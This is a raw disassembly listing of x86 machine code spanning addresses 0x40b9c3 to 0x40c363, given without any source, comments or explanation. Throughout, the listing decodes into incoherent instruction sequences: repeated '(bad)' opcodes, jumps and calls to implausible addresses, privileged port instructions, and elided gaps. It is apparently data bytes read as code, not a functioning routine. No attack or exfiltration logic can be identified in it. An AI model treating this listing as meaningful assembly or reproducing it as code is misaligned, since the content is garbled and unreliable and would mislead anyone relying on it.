  40b9c3:	jle    0x40b9ba
  40b9c5:	lock enter 0x7474,0x3
  40b9ca:	ja     0x40b994
  40b9cc:	push   di
  40b9ce:	or     BYTE PTR [ecx+0x70],ch
  40b9d1:	cwde   
  40b9d2:	stc    
  40b9d3:	xor    ecx,DWORD PTR [edx+0x53]
  40b9d6:	lea    eax,[eax]
	...
  40b9f0:	jns    0x40ba5f
  40b9f2:	out    dx,al
  40b9f3:	(bad)  
  40b9f4:	and    ebp,DWORD PTR [ebx+eax*4+0x6f70ecc1]
  40b9fb:	cld    
  40b9fc:	sbb    al,0xbf
  40b9fe:	xlat   BYTE PTR ds:[ebx]
  40b9ff:	dec    DWORD PTR [ebx]
  40ba01:	pop    ecx
  40ba02:	les    esi,FWORD PTR [ebx-0x58]
  40ba05:	push   di
  40ba07:	cld    
  40ba08:	mov    edi,0x7f4d792b
  40ba0d:	lahf   
  40ba0e:	adc    dh,bh
  40ba10:	int3   
  40ba11:	test   edx,0x23f22f8c
  40ba17:	shl    DWORD PTR [edi+0x1f],0x3c
  40ba1b:	jnp    0xf019b218
  40ba21:	and    al,0x85
  40ba23:	sar    eax,0x8d
  40ba26:	jge    0x40b9bc
  40ba28:	fs add eax,0x57b2f0e3
  40ba2e:	push   0xffffffc3
  40ba30:	not    DWORD PTR [edx+ecx*1-0x43]
  40ba34:	or     eax,0x2dccc100
  40ba39:	pop    es
  40ba3a:	jmp    0xa1c165bb
  40ba3f:	ja     0x40ba2e
  40ba41:	jge    0x40ba6e
  40ba43:	cld    
  40ba44:	outs   dx,BYTE PTR ds:[esi]
  40ba45:	sub    eax,0x42a0ac1
  40ba4a:	jmp    0x23be20cb
  40ba4f:	std    
  40ba50:	push   ebx
  40ba51:	mov    edi,0x2e8
	...
  40ba6a:	add    BYTE PTR [eax],al
  40ba6c:	add    ah,dh
  40ba6e:	jle    0x40ba93
  40ba70:	std    
  40ba71:	dec    esi
  40ba72:	pop    es
  40ba73:	mov    ebx,0x224ab2c3
  40ba78:	mov    ebx,0x56e90135
  40ba7d:	outs   dx,DWORD PTR ds:[esi]
  40ba7e:	fldenv [edi-0x21]
  40ba81:	inc    edi
  40ba82:	add    al,0xe9
  40ba84:	add    eax,edi
  40ba86:	jge    0x40ba43
  40ba88:	(bad)  
  40ba89:	jle    0x40bad1
  40ba8b:	stc    
  40ba8c:	clc    
  40ba8d:	dec    ebx
  40ba8e:	push   ebx
  40ba8f:	bnd ret 
  40ba91:	ret    0xc177
  40ba94:	sbb    edi,edx
  40ba96:	shr    ebp,0xb9
  40ba99:	retf   
  40ba9a:	add    eax,0x7d03db6a
  40ba9f:	stos   DWORD PTR es:[edi],eax
  40baa0:	iret   
  40baa1:	jmp    0xb104:0xf405f080
  40baa8:	cmp    esp,DWORD PTR [eax+0x2f]
  40baab:	mov    eax,ds:0xa122683b
  40bab0:	cmp    esp,DWORD PTR [eax-0x7]
  40bab3:	imul   ebx,ebx,0x35e6711f
  40bab9:	mov    ah,0xdb
  40babb:	(bad)  
  40babc:	out    dx,eax
  40babd:	cmc    
  40babe:	add    al,0x0
  40bac0:	bound  esi,QWORD PTR [edx]
  40bac2:	std    
  40bac3:	mov    ch,cl
  40bac5:	mov    ds:0xf7e88799,al
  40baca:	add    al,0x8b
  40bacc:	mov    edx,0xe99805c0
	...
  40bae9:	add    bh,dh
  40baeb:	fndisi(8087 only) 
  40baed:	call   0x353fbfe9
  40baf2:	mov    BYTE PTR [esi-0x3e],bh
  40baf5:	ror    DWORD PTR [edx-0x19],0xfe
  40baf9:	scas   al,BYTE PTR es:[edi]
  40bafa:	cdq    
  40bafb:	(bad)  
  40bafc:	add    cl,ch
  40bafe:	idiv   DWORD PTR [ebp-0x36]
  40bb01:	xchg   ecx,eax
  40bb02:	ins    BYTE PTR es:[edi],dx
  40bb03:	cmc    
  40bb04:	add    cl,ch
  40bb06:	fld    DWORD PTR [ebp-0x3d1a1209]
  40bb0c:	out    0x1d,eax
  40bb0e:	jmp    0x40b2bb19
  40bb13:	jle    0x40bb57
  40bb15:	fld    DWORD PTR [esi]
  40bb17:	xlat   BYTE PTR ds:[ebx]
  40bb18:	mov    ah,dh
  40bb1a:	dec    ebx
  40bb1b:	cs repnz fsubr st(4),st
  40bb1f:	icebp  
  40bb20:	xlat   BYTE PTR ds:[ebx]
  40bb21:	add    dh,BYTE PTR [eax]
  40bb23:	xchg   dl,al
  40bb25:	mov    eax,ds:0xa0ab222
  40bb2a:	xor    esi,edx
  40bb2c:	fcomp  DWORD PTR [ebx+0x6a51bbfe]
  40bb32:	xor    BYTE PTR ds:0x5b3f0a50,al
  40bb38:	add    eax,DWORD PTR [ecx-0x1]
  40bb3b:	cmp    al,BYTE PTR [edx]
  40bb3d:	jmp    0x17c593b0
  40bb42:	ins    BYTE PTR es:[edi],dx
  40bb43:	ja     0x40bacf
  40bb45:	lods   al,BYTE PTR ds:[esi]
  40bb46:	fistp  QWORD PTR [ebx+0x37]
  40bb49:	bound  ebp,QWORD PTR [edx+0x46e0]
	...
  40bb67:	mov    BYTE PTR [ecx],al
  40bb69:	add    BYTE PTR [edx-0x636eb],cl
  40bb6f:	int    0x4
  40bb71:	jmp    0x4587df
  40bb76:	cmp    ebx,DWORD PTR [edi+0x6d]
  40bb79:	add    eax,0xe9d8e089
  40bb7e:	push   es
  40bb7f:	push   cs
  40bb80:	les    ebp,FWORD PTR [edx]
  40bb82:	mov    eax,edx
  40bb84:	fdiv   DWORD PTR [ecx]
  40bb86:	jmp    DWORD PTR ds:0x9dffffc3
  40bb8c:	test   DWORD PTR [ebx-0x228b4f0],eax
  40bb92:	push   edi
  40bb93:	(bad)  [ecx+0x54]
  40bb96:	lock in al,0x74
  40bb99:	hlt    
  40bb9a:	jmp    DWORD PTR [eax+0x54]
  40bb9d:	push   ss
  40bb9e:	inc    eax
  40bb9f:	dec    ebp
  40bba0:	xor    eax,eax
  40bba2:	adc    DWORD PTR [ecx+0x694587e8],0x19
  40bba9:	inc    esi
  40bbaa:	add    al,0x4b
  40bbac:	bound  ecx,QWORD PTR [ecx+0x356b7545]
  40bbb2:	add    eax,DWORD PTR [eax-0x34]
  40bbb5:	mov    eax,DWORD PTR [esi+0x25]
  40bbb8:	push   esp
  40bbb9:	mov    DWORD PTR [ebp-0x43],esi
  40bbbc:	push   0x33b5e444
  40bbc1:	pop    ss
  40bbc2:	add    cl,BYTE PTR ds:0x1275be80
  40bbc8:	cmp    ebp,0xa
	...
  40bbe3:	add    BYTE PTR [esi-0x16],cl
  40bbe6:	push   0x8bc19601
  40bbeb:	dec    ebp
  40bbec:	mov    ebp,0xdf1339cb
  40bbf1:	add    ebp,ebx
  40bbf3:	and    DWORD PTR [edx],ecx
  40bbf5:	ins    DWORD PTR es:[edi],dx
  40bbf6:	clc    
  40bbf7:	mov    esi,esp
  40bbf9:	cwde   
  40bbfa:	out    0x8c,al
  40bbfc:	popa   
  40bbfd:	push   cs
  40bbfe:	fucomi st,st(7)
  40bc00:	call   0xbccbbee0
  40bc05:	pusha  
  40bc06:	mov    esp,0x4862e477
  40bc0b:	loopne 0x40bc7c
  40bc0d:	neg    edx
  40bc0f:	nop
  40bc10:	pop    es
  40bc11:	fadd   QWORD PTR [edx]
  40bc13:	mov    ecx,DWORD PTR [ecx-0x26]
  40bc16:	ja     0x40bc94
  40bc18:	test   al,0xce
  40bc1a:	inc    esi
  40bc1b:	in     al,dx
  40bc1c:	outs   dx,DWORD PTR ds:[esi]
  40bc1d:	and    al,dh
  40bc1f:	mov    al,BYTE PTR [ecx-0x2e]
  40bc22:	add    BYTE PTR [esp+ebx*4+0x5],0x79
  40bc27:	out    dx,eax
  40bc28:	mov    edi,0x597c0825
  40bc2d:	xchg   esi,eax
  40bc2e:	xor    eax,0x290b0e8
  40bc33:	add    dl,al
  40bc35:	xchg   ebp,eax
  40bc36:	mov    ch,0xec
  40bc38:	cmc    
  40bc39:	fld    QWORD PTR [ebp+0x78fcdafe]
  40bc3f:	inc    esp
  40bc40:	inc    esp
  40bc41:	je     0x40bc8a
  40bc43:	cld    
  40bc44:	jns    0x40bca6
  40bc46:	daa    
  40bc47:	inc    BYTE PTR [eax]
	...
  40bc61:	inc    ebx
  40bc62:	outs   dx,BYTE PTR ds:[esi]
  40bc63:	jnp    0x40bca9
  40bc65:	call   0x80392bce
  40bc6a:	enter  0x8afe,0xa9
  40bc6e:	dec    ecx
  40bc6f:	add    ebp,0x174c450f
  40bc75:	neg    ch
  40bc77:	ja     0x40bcf5
  40bc79:	add    BYTE PTR [eax-0x220f8181],bh
  40bc7f:	jne    0x40bc8b
  40bc81:	mov    ds,esp
  40bc83:	pop    eax
  40bc84:	add    al,0xa3
  40bc86:	inc    ebp
  40bc87:	add    dh,BYTE PTR [esi-0xb]
  40bc8a:	add    al,0xe9
  40bc8c:	cmc    
  40bc8d:	icebp  
  40bc8e:	add    dl,BYTE PTR [ebp+edx*1+0x1383044e]
  40bc95:	imul   edi,DWORD PTR [esi],0xf5dc53e7
  40bc9b:	jnp    0x40bc9f
  40bc9d:	hlt    
  40bc9e:	fadd   QWORD PTR [esi-0x70fb0a8a]
  40bca4:	jp     0x40bcd8
  40bca6:	punpckhdq mm0,QWORD PTR [edi-0x50]
  40bcaa:	sub    eax,0xe5d8c46a
  40bcaf:	sub    ebp,esp
  40bcb1:	ins    BYTE PTR es:[edi],dx
  40bcb2:	push   0x7a6076e5
  40bcb7:	dec    ebx
  40bcb8:	clc    
  40bcb9:	jle    0x40bcfd
  40bcbb:	fxtract 
  40bcbd:	mov    ds:0x3920a90a,eax
  40bcc2:	leave  
  40bcc3:	imul   eax,eax,0x0
	...
  40bcdd:	add    BYTE PTR [ebx],dh
  40bcdf:	div    BYTE PTR [ebp-0x8]
  40bce2:	push   0xffffffcc
  40bce4:	add    DWORD PTR [ebx+0x54cbe5de],edi
  40bcea:	jno    0x40bc7c
  40bcec:	clc    
  40bced:	in     eax,dx
  40bcee:	pop    edx
  40bcef:	out    0x3a,al
  40bcf1:	adc    DWORD PTR [ebx+0x3f211901],0x85dbea5b
  40bcfb:	cmp    eax,0xf56f03eb
  40bd00:	arpl   bp,si
  40bd02:	test   al,0xf7
  40bd04:	gs jbe 0x40bd2b
  40bd07:	(bad)  
  40bd09:	fdivrp st(4),st
  40bd0b:	add    al,0x40
  40bd0d:	sbb    ebx,DWORD PTR [edx]
  40bd0f:	out    0x4d,al
  40bd11:	js     0x40bccb
  40bd13:	cld    
  40bd14:	jno    0x40bd41
  40bd16:	jg     0x40bcdf
  40bd18:	push   eax
  40bd19:	loop   0x40bcc9
  40bd1b:	add    eax,DWORD PTR [eax]
  40bd1d:	jmp    0x55288a9f
  40bd22:	loope  0x40bd09
  40bd24:	(bad)  
  40bd25:	es (bad) 
  40bd27:	cmc    
  40bd28:	out    0x16,eax
  40bd2a:	ret    
  40bd2b:	add    al,0x0
  40bd2d:	arpl   WORD PTR [edx+ebx*8+0x70e0ba08],si
  40bd34:	or     BYTE PTR [ecx],dl
  40bd36:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40bd37:	jmp    0x205b:0x472ffefe
  40bd3e:	mov    ch,0xfd
  40bd40:	call   DWORD PTR [ebx+0x0]
	...
  40bd5a:	add    BYTE PTR [edx+ebx*8],ch
  40bd5d:	adc    ch,0xb8
  40bd60:	add    al,0x0
  40bd62:	jmp    0x62980cb1
  40bd67:	or     eax,0x13d98afd
  40bd6c:	(bad)  
  40bd6d:	(bad)  
  40bd6e:	jns    0x40bdd0
  40bd70:	add    al,0x0
  40bd72:	jmp    0x44350e73
  40bd77:	cmc    
  40bd78:	dec    esp
  40bd79:	mov    ebx,DWORD PTR [edi-0x1766a1b0]
  40bd7f:	test   DWORD PTR [eax-0x331c1141],0x79f7e900
  40bd89:	sbb    al,0x31
  40bd8b:	out    0x44,al
  40bd8d:	add    BYTE PTR [ebx],dl
  40bd8f:	hlt    
  40bd90:	ja     0x40bdd6
  40bd92:	jne    0x40bd34
  40bd94:	je     0x40bd22
  40bd96:	sub    eax,esi
  40bd98:	push   esp
  40bd99:	call   FWORD PTR [edx+0x6c0bc17b]
  40bd9f:	xor    BYTE PTR [ecx+0x18],dh
  40bda2:	shl    esp,cl
  40bda4:	ja     0x40bdea
  40bda6:	pop    ebp
  40bda7:	mov    eax,0xf7a98c6c
  40bdac:	push   esp
  40bdad:	inc    DWORD PTR [eax]
  40bdaf:	out    dx,al
  40bdb0:	jge    0x40bd74
  40bdb2:	or     al,0x98
  40bdb4:	ror    BYTE PTR ds:0x9f85,0x0
  40bdbb:	push   eax
  40bdbc:	xchg   BYTE PTR [edx],dh
  40bdbe:	inc    DWORD PTR [eax]
	...
  40bdd8:	adc    dh,al
  40bdda:	dec    esi
  40bddb:	call   0x4034be
  40bde0:	dec    ecx
  40bde1:	leave  
  40bde2:	or     eax,0xa4e84
  40bde7:	add    BYTE PTR [ebx-0x75],bh
  40bdea:	mov    ebx,0xfdefc234
  40bdef:	add    bh,BYTE PTR [eax]
  40bdf1:	fdivr  QWORD PTR [esi-0x43]
  40bdf4:	gs out dx,eax
  40bdf6:	std    
  40bdf7:	call   DWORD PTR [edx]
  40bdf9:	loopne 0x40bd8d
  40bdfb:	rol    dh,0x27
  40bdfe:	add    WORD PTR [eax-0x3d0000cc],0xfff7
  40be06:	je     0x40be23
  40be08:	daa    
  40be09:	stc    
  40be0a:	mov    WORD PTR [ebp-0x2107f],es
  40be10:	fld    QWORD PTR [eax-0x6c]
  40be13:	mov    bl,BYTE PTR ds:0xded3ff09
  40be19:	mov    ds:0x1235f70a,eax
  40be1e:	sar    dh,0x8d
  40be21:	ret    
  40be22:	add    BYTE PTR [edx],dh
  40be24:	popf   
  40be25:	fs mov edi,0x11dd90f
  40be2b:	add    BYTE PTR [ebp+0x63],cl
  40be2e:	push   es
  40be2f:	mov    ecx,ebp
  40be31:	pop    edi
  40be32:	add    BYTE PTR [eax],al
  40be34:	sbb    eax,0xa4f44c5d
  40be39:	sbb    al,0xe8
  40be3b:	mov    eax,DWORD PTR [eax]
	...
  40be55:	and    eax,0xf4e443c7
  40be5a:	cmc    
  40be5b:	jno    0x40be9d
  40be5d:	hlt    
  40be5e:	fs jo  0x40be4d
  40be61:	jno    0x40be78
  40be63:	cli    
  40be64:	adc    eax,0xffffffec
  40be67:	add    al,BYTE PTR [eax]
  40be69:	sti    
  40be6a:	pop    esp
  40be6b:	xchg   ebx,eax
  40be6c:	add    ah,dh
  40be6e:	in     eax,dx
  40be6f:	ja     0x40bebd
  40be71:	shl    BYTE PTR [edi+0x3],1
  40be74:	push   ecx
  40be75:	inc    esp
  40be76:	test   dh,0x94
  40be79:	hlt    
  40be7a:	in     eax,dx
  40be7b:	fist   DWORD PTR [esi*8-0xc74fd13]
  40be82:	or     dh,BYTE PTR [ebx+0x2edf58f]
  40be88:	lea    esp,[ecx]
  40be8a:	sbb    DWORD PTR [ebp+0x27],ebx
  40be8d:	dec    esp
  40be8e:	addr16 mov ecx,0x28572e7
  40be94:	add    BYTE PTR [eax-0x53],bh
  40be97:	clc    
  40be98:	sbb    DWORD PTR [ebp+ebp*8-0x16e1fffe],0x75
  40bea0:	inc    esp
  40bea1:	cmp    ch,0x76
  40bea4:	inc    esp
  40bea5:	cmp    al,0xfd
  40bea7:	call   0x4304e6c0
  40beac:	add    BYTE PTR [edi-0x16],bh
  40beaf:	and    DWORD PTR [eax+ebx*1-0xb011754],0x6e
  40beb7:	les    eax,FWORD PTR [ebx]
	...
  40bed1:	add    BYTE PTR [edi-0x4f],dh
  40bed4:	test   DWORD PTR [edi-0x7f],0x4bfe1868
  40bedb:	mov    bl,bl
  40bedd:	sti    
  40bede:	mov    esi,0x86a02ed
  40bee3:	clc    
  40bee4:	jbe    0x40bf32
  40bee6:	ins    BYTE PTR es:[edi],dx
  40bee7:	inc    eax
  40bee8:	jg     0x40bf15
  40beea:	sub    al,BYTE PTR [esi+eiz*2]
  40beed:	jmp    0x41dd50d
  40bef2:	hlt    
  40bef3:	test   bl,dl
  40bef5:	stos   DWORD PTR es:[edi],eax
  40bef6:	adc    edx,DWORD PTR [edx]
  40bef8:	gs mov dh,0xb
  40befb:	jecxz  0x40bee5
  40befd:	add    DWORD PTR [eax+0x72f8e89e],0xffffffac
  40bf04:	call   0x1256b30c
  40bf09:	pop    esi
  40bf0a:	hlt    
  40bf0b:	inc    ebp
  40bf0c:	je     0x40bf45
  40bf0e:	les    ecx,FWORD PTR [esi-0x363623e2]
  40bf14:	out    0x3,eax
  40bf16:	or     DWORD PTR [eax-0x1d351628],0xf9397698
  40bf20:	adc    BYTE PTR [ebx-0x716fac3],ch
  40bf26:	imul   edx,DWORD PTR [eax+0x32],0xf03ef65e
  40bf2d:	xchg   ecx,eax
  40bf2e:	fild   DWORD PTR [esi]
  40bf30:	jmp    0x6a052e38
  40bf35:	fild   DWORD PTR [eax]
	...
  40bf4f:	pop    ss
  40bf50:	pop    ecx
  40bf51:	aaa    
  40bf52:	sbb    eax,0x1d1b59b6
  40bf57:	mov    dh,0x59
  40bf59:	cld    
  40bf5a:	sbb    al,0xb6
  40bf5c:	pop    ecx
  40bf5d:	lock test BYTE PTR [ebx+0x43],bl
  40bf61:	xor    eax,0x1cc71f0d
  40bf66:	arpl   WORD PTR [edi],cx
  40bf68:	(bad)  
  40bf69:	adc    eax,DWORD PTR [edi+0x6f]
  40bf6c:	dec    eax
  40bf6d:	loope  0x40bfeb
  40bf6f:	push   ebx
  40bf70:	cmp    BYTE PTR [esi-0x16fb884d],cl
  40bf76:	add    ecx,DWORD PTR [eax+ebx*8-0x10]
  40bf7a:	add    eax,0x22ffedf4
  40bf7f:	js     0x40bfe2
  40bf81:	mov    ecx,0x8b489aea
  40bf86:	lods   al,BYTE PTR ds:[esi]
  40bf87:	pop    ds
  40bf88:	(bad)  
  40bf89:	push   DWORD PTR [esi-0x177c4e68]
  40bf8f:	test   DWORD PTR [eax+ebp*8],0x40981
  40bf96:	push   edx
  40bf97:	(bad)  
  40bf98:	lea    eax,[ecx+esi*8-0x5b]
  40bf9c:	test   DWORD PTR [edi-0x47ae951f],edi
  40bfa2:	inc    ecx
  40bfa3:	sbb    DWORD PTR [esi+0x1c0e8ff],esi
  40bfa9:	adc    DWORD PTR [eax],0x3b
  40bfac:	pop    ecx
  40bfad:	or     edx,eax
  40bfaf:	xchg   ecx,eax
  40bfb0:	pop    eax
  40bfb1:	pop    ss
  40bfb2:	popa   
	...
  40bfcb:	add    BYTE PTR [edx],bh
  40bfcd:	aad    0xea
  40bfcf:	jmp    0xd549:0xfef0413f
  40bfd6:	push   ebp
  40bfd7:	bound  esp,QWORD PTR [edx]
  40bfd9:	or     eax,0xe9af2783
  40bfde:	js     0x40bf99
  40bfe0:	clc    
  40bfe1:	add    al,0x5f
  40bfe3:	aas    
  40bfe4:	das    
  40bfe5:	int3   
  40bfe6:	shr    ebp,0xf7
  40bfe9:	aaa    
  40bfea:	mov    edi,DWORD PTR [ebp+0x68f7e577]
  40bff0:	pushf  
  40bff1:	adc    eax,0x3af7e903
  40bff6:	push   0xffffffe9
  40bff8:	int    0x4
  40bffa:	lea    esp,ds:0xb7e7f514
  40c000:	aaa    
  40c001:	add    al,0x0
  40c003:	jb     0x40bfea
  40c005:	or     al,0x8b
  40c007:	out    dx,eax
  40c008:	into   
  40c009:	dec    ecx
  40c00a:	add    al,0x60
  40c00c:	or     al,0x29
  40c00e:	or     al,0x0
  40c010:	(bad)  
  40c011:	and    BYTE PTR [eax],cl
  40c013:	add    DWORD PTR ds:0xd989ff05,0x24
  40c01a:	adc    BYTE PTR [edx+0x6081dcd5],cl
  40c020:	and    eax,0xf14c8805
  40c025:	hlt    
  40c026:	mov    DWORD PTR [eax+0x18],ecx
  40c029:	pop    ebp
  40c02a:	dec    ebx
  40c02b:	and    al,0x0
  40c02d:	pop    esi
  40c02e:	or     eax,0x8b
	...
  40c047:	add    BYTE PTR [eax],al
  40c049:	dec    ebp
  40c04a:	cmc    
  40c04b:	mov    BYTE PTR [ecx+esi*8+0x10],al
  40c04f:	test   ecx,ecx
  40c051:	mov    cl,0xe2
  40c053:	mov    DWORD PTR [ecx],eax
  40c055:	mov    bh,0x9
  40c057:	call   DWORD PTR [eax]
  40c059:	sbb    ch,BYTE PTR [edi+0x4]
  40c05c:	lea    edx,[ecx+0x4de80c00]
  40c062:	out    dx,al
  40c063:	std    
  40c064:	inc    DWORD PTR [ebx-0x33159444]
  40c06a:	add    al,0x8d
  40c06c:	je     0x40c01f
  40c06e:	fsubr  st(6),st
  40c070:	(bad)
  40c073:	add    BYTE PTR [ebx],dh
  40c075:	fld    QWORD PTR [esi-0x75]
  40c078:	in     eax,0x38
  40c07a:	ret    
  40c07b:	add    al,BYTE PTR [eax]
  40c07d:	loopne 0x40c0da
  40c07f:	jmp    0x40c0d2
  40c081:	into   
  40c082:	dec    esi
  40c083:	push   edi
  40c084:	mov    esp,DWORD PTR [ebp-0x5afbb9a5]
  40c08a:	cmp    BYTE PTR [edx+0x765b8d00],dh
  40c090:	add    al,0xde
  40c092:	fs cld 
  40c094:	add    al,cl
  40c096:	dec    ecx
  40c097:	or     al,0x53
  40c099:	call   0x8b09:0xd1217f5
  40c0a0:	push   es
  40c0a1:	hlt    
  40c0a2:	jo     0x40c067
  40c0a4:	jae    0x40c08b
  40c0a6:	bound  ebp,QWORD PTR [ebp+0x4]
  40c0a9:	ja     0x40c073
  40c0ab:	add    dh,BYTE PTR [eax+eax*1+0x0]
	...
  40c0c3:	add    BYTE PTR [eax],al
  40c0c5:	add    bh,dh
  40c0c7:	pop    esi
  40c0c8:	inc    eax
  40c0c9:	cld    
  40c0ca:	ja     0x40c07c
  40c0cc:	inc    BYTE PTR [edi-0x5f]
  40c0cf:	pop    ebx
  40c0d0:	push   edx
  40c0d1:	dec    DWORD PTR [ecx]
  40c0d3:	or     dl,BYTE PTR [edx]
  40c0d5:	inc    eax
  40c0d6:	hlt    
  40c0d7:	ins    BYTE PTR es:[edi],dx
  40c0d8:	push   0x2ed36fc
  40c0dd:	add    BYTE PTR [edx-0x13b3861e],al
  40c0e3:	jo     0x40c0a1
  40c0e5:	jae    0x40c097
  40c0e7:	push   edx
  40c0e8:	add    al,0xeb
  40c0ea:	xor    ah,al
  40c0ec:	cli    
  40c0ed:	out    0xd4,eax
  40c0ef:	inc    esp
  40c0f0:	add    al,0x0
  40c0f2:	outs   dx,DWORD PTR ds:[esi]
  40c0f3:	enter  0x8afa,0xe4
  40c0f7:	push   0x841873ed
  40c0fc:	add    dl,BYTE PTR [esi+0x5c]
  40c0ff:	int3   
  40c100:	mov    WORD PTR [edi],?
  40c102:	hlt    
  40c103:	push   esp
  40c104:	add    eax,0x79ea3a89
  40c109:	jle    0x40c103
  40c10b:	test   DWORD PTR [edx],eax
  40c10d:	add    ah,bh
  40c10f:	in     eax,dx
  40c110:	fidivr DWORD PTR [edx+0x66]
  40c113:	in     eax,dx
  40c114:	add    al,BYTE PTR [esp+esi*4-0x63a9edc8]
  40c11b:	call   0x73c9:0x68f400da
  40c122:	in     al,dx
  40c123:	push   edx
  40c124:	add    DWORD PTR [ebx-0xfccc51],ecx
	...
  40c142:	add    BYTE PTR [edi+esi*8],al
  40c145:	inc    ebp
  40c146:	pop    ebx
  40c147:	cmp    eax,0xc9ffffab
  40c14c:	add    al,0x72
  40c14e:	fdiv   DWORD PTR [esi-0x10]
  40c151:	in     al,dx
  40c152:	push   eax
  40c153:	pop    es
  40c154:	mov    esp,0xd57f4d3e
  40c159:	pop    edi
  40c15a:	inc    edi
  40c15b:	inc    eax
  40c15c:	sbb    ebp,DWORD PTR [edx+0x238de170]
  40c162:	lock sbb esp,DWORD PTR [ebx+0x6af402f7]
  40c169:	call   0xd31d79e8
  40c16e:	sti    
  40c16f:	push   0x1f545549
  40c174:	or     bl,al
  40c176:	add    ah,BYTE PTR [edi-0x13c09dcd]
  40c17c:	xor    ebx,DWORD PTR [edx-0x5a9df3b0]
  40c182:	add    esp,esi
  40c184:	mov    DWORD PTR [eax],esi
  40c186:	sub    edi,ebp
  40c188:	pop    ecx
  40c189:	(bad)  
  40c18a:	fistp  DWORD PTR [edi+0x54]
  40c18d:	call   0x5ff3e895
  40c192:	jl     0x40c17a
  40c194:	add    al,0xe9
  40c196:	in     al,dx
  40c197:	les    ecx,FWORD PTR [edx+0x7db58325]
  40c19d:	ret    0xf403
  40c1a0:	xor    bh,dh
  40c1a2:	sub    eax,0x2a32f9c
	...
  40c1bf:	add    ah,dh
  40c1c1:	mov    esp,DWORD PTR [ebx+0x66c1dee7]
  40c1c7:	sub    esp,ebx
  40c1c9:	aas    
  40c1ca:	in     eax,dx
  40c1cb:	outs   dx,DWORD PTR ds:[esi]
  40c1cc:	retf   0x3d89
  40c1cf:	je     0x40c250
  40c1d1:	retf   
  40c1d2:	shl    BYTE PTR [edi-0x6e],0x4
  40c1d6:	jmp    0xd71e3938
  40c1db:	jno    0x40c1f7
  40c1dd:	mov    bh,bh
  40c1df:	sub    al,BYTE PTR [eax]
  40c1e1:	sbb    al,bl
  40c1e3:	xor    eax,0xd5578ff5
  40c1e8:	push   eax
  40c1e9:	pop    eax
  40c1ea:	add    al,0x6c
  40c1ec:	mov    ch,0x4c
  40c1ee:	divps  xmm1,XMMWORD PTR [edi-0x29]
  40c1f2:	fdiv   st,st(2)
  40c1f4:	jle    0x40c229
  40c1f6:	and    esi,DWORD PTR [ecx-0xe8b225a]
  40c1fc:	stos   BYTE PTR es:[edi],al
  40c1fd:	inc    edi
  40c1fe:	or     BYTE PTR [ecx-0x17004cf5],al
  40c204:	pushf  
  40c205:	(bad)  
  40c206:	out    0x98,eax
  40c208:	or     eax,0xd272fede
  40c20d:	loopne 0x40c26d
  40c20f:	mov    bh,0xbc
  40c211:	retf   
  40c212:	shl    ecx,0xf7
  40c215:	aaa    
  40c216:	mov    edx,DWORD PTR [ebp+0x74]
  40c219:	loop   0x40c212
  40c21b:	push   0xffffffcb
  40c21d:	stc    
  40c21e:	xchg   DWORD PTR [ebp+0x2932f90b],ebp
	...
  40c23c:	add    BYTE PTR [edi+eiz*2-0x77],al
  40c240:	lods   eax,DWORD PTR ds:[esi]
  40c241:	sti    
  40c242:	sti    
  40c243:	xor    al,BYTE PTR [edx+0x41]
  40c246:	popf   
  40c247:	dec    edi
  40c248:	in     al,dx
  40c249:	test   DWORD PTR [edi+edx*2],0x24423e87
  40c250:	retf   0x4179
  40c253:	and    al,0xef
  40c255:	test   DWORD PTR [ebx-0x73f832a5],0xc6f3c55b
  40c25f:	inc    ebx
  40c260:	or     eax,0x5c8b0507
  40c265:	add    BYTE PTR [edx+0x4fedc106],cl
  40c26b:	add    ecx,ebp
  40c26d:	jnp    0x40c20c
  40c26f:	push   cs
  40c270:	add    BYTE PTR [ecx],cl
  40c272:	mov    esi,edi
  40c274:	call   FWORD PTR [ebp+0x6f]
  40c277:	add    DWORD PTR [edx+0x58],ebp
  40c27a:	je     0x40c2be
  40c27c:	and    al,0xf5
  40c27e:	sbb    BYTE PTR [ebx+0x6f6145],cl
  40c284:	push   0x5d
  40c286:	outs   dx,DWORD PTR ds:[esi]
  40c287:	add    al,0xe8
  40c289:	rol    BYTE PTR [ebp+0x2],1
  40c28c:	add    dh,dl
  40c28e:	mov    eax,0x8542f683
  40c293:	adc    DWORD PTR [ecx],eax
  40c295:	sbb    eax,0x4e886801
  40c29a:	add    DWORD PTR [eax],eax
  40c29c:	jmp    FWORD PTR [edx-0x17]
  40c29f:	gs dec ecx
	...
  40c2b9:	add    BYTE PTR [ecx+eax*1],cl
  40c2bc:	mov    edi,eax
  40c2be:	sahf   
  40c2bf:	loope  0x40c2c0
  40c2c1:	jl     0x40c2d7
  40c2c3:	jmp    0x14ebced
  40c2c8:	mov    eax,edi
  40c2ca:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c2cb:	mov    edi,DWORD PTR cs:[esi-0x53]
  40c2cf:	mov    ecx,ebp
  40c2d1:	call   0x4099f2
  40c2d6:	mov    ebx,0xe204f683
  40c2db:	sbb    ah,0x0
  40c2de:	fisttp QWORD PTR [eax]
  40c2e0:	lea    eax,[edi-0x27]
  40c2e3:	sbb    bh,bh
  40c2e5:	adc    eax,0x3ed1c5
  40c2ea:	in     eax,0x0
  40c2ec:	cli    
  40c2ed:	add    BYTE PTR [ebp+0x2189bff3],bl
  40c2f3:	and    al,0x1c
  40c2f5:	inc    eax
  40c2f6:	push   cs
  40c2f7:	mov    ecx,0xe69b75fd
  40c2fc:	inc    edx
  40c2fd:	and    al,0xa2
  40c2ff:	mov    BYTE PTR [edx+0x24],bh
  40c302:	hlt    
  40c303:	loop   0x40c30a
  40c305:	pcmpeqd mm7,QWORD PTR [edi]
  40c308:	jecxz  0x40c308
  40c30a:	jnp    0x40c2c1
  40c30c:	xchg   esi,eax
  40c30d:	push   DWORD PTR [ebx-0x12]
  40c310:	adc    eax,0x39677c0
  40c315:	pshufw mm0,QWORD PTR [ebp+0x56f40002],0x4f
  40c31d:	and    al,0x0
	...
  40c337:	lock push esi
  40c339:	push   esp
  40c33a:	adc    BYTE PTR [ecx+0x7c],dh
  40c33d:	push   esi
  40c33e:	add    esi,DWORD PTR [edi-0x5c]
  40c341:	lea    esp,cs:[edx+0x2266eae9]
  40c348:	in     eax,dx
  40c349:	add    ah,BYTE PTR [esi+0x77]
  40c34c:	xchg   BYTE PTR [esi],al
  40c34e:	packssdw mm2,QWORD PTR [esi-0x74]
  40c352:	jnp    0x40c324
  40c354:	add    eax,0xe188da89
  40c359:	sbb    ebx,DWORD PTR [esi]
  40c35b:	cmp    edx,0xb1f43d86
  40c361:	adc    al,0x66
  40c363:	mov    edi,0x6b2326c1
